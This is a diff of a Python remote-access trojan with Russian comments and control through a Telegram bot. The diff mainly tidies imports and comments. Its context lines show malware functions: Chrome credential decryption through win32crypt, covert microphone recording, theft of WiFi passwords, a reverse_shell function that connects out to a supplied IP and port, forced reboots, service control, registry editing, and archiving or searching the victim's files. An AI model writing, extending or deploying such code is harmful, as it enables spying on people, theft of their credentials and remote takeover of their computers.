@@ -1,5 +1,7 @@
-import os
 import sys
+import os
+sys.path.append(os.path.dirname(os.path.abspath(__file__)))
+
 import json
 import subprocess
 import threading
@@ -24,21 +26,19 @@ import re
 import numpy as np
 from python_telegram_bot import Updater, CommandHandler
 
-# ===== ЗАГЛУШКА ДЛЯ win32crypt (чтобы компилировалось на Linux) =====
+# ===== ЗАГЛУШКИ ДЛЯ ЛИНУКС (чтобы компилировалось) =====
 try:
     import win32crypt
 except ImportError:
     win32crypt = None
     print("[!] win32crypt не найден, функции Chrome будут недоступны")
 
-# ===== ЗАГЛУШКА ДЛЯ pyaudio (чтобы компилировалось на Linux) =====
 try:
     import pyaudio
 except ImportError:
     pyaudio = None
     print("[!] pyaudio не найден, запись микрофона будет недоступна")
 
-# ===== ЗАГЛУШКА ДЛЯ wmi =====
 try:
     import wmi
 except ImportError:
@@ -278,7 +278,7 @@ def record_mic(seconds=10):
     except Exception as e:
         return str(e)
 
-# ==================== НОВЫЕ ФУНКЦИИ ====================
+# ==================== ОСНОВНЫЕ ФУНКЦИИ ====================
 def reboot_pc():
     os.system("shutdown /r /t 1")
     return "Rebooting..."
@@ -459,7 +459,6 @@ def tree_directory(path, indent=0):
     except:
         return "Access denied"
 
-# ==================== WIFI ПАРОЛИ ====================
 def get_wifi_passwords():
     try:
         output = ""
@@ -480,7 +479,6 @@ def get_wifi_passwords():
     except Exception as e:
         return str(e)
 
-# ==================== УПРАВЛЕНИЕ СЛУЖБАМИ ====================
 def service_control(name, action):
     try:
         subprocess.run(f"net {action} {name}", shell=True, check=True)
@@ -488,7 +486,6 @@ def service_control(name, action):
     except Exception as e:
         return str(e)
 
-# ==================== ОБРАТНАЯ ОБОЛОЧКА ====================
 def reverse_shell(ip, port):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -503,7 +500,6 @@ def reverse_shell(ip, port):
     except Exception as e:
         pass
 
-# ==================== РЕЕСТР ====================
 def reg_get(path, key):
     try:
         result = subprocess.run(f'reg query "{path}" /v "{key}"', shell=True, capture_output=True, text=True)
@@ -518,7 +514,6 @@ def reg_set(path, key, value):
     except Exception as e:
         return str(e)
 
-# ==================== АРХИВАЦИЯ ====================
 def zip_folder(path):
     try:
         shutil.make_archive("archive", 'zip', path)
@@ -526,7 +521,6 @@ def zip_folder(path):
     except Exception as e:
         return str(e)
 
-# ==================== ПОИСК ФАЙЛОВ ====================
 def search_files(pattern, root=os.getcwd()):
     try:
         results = []
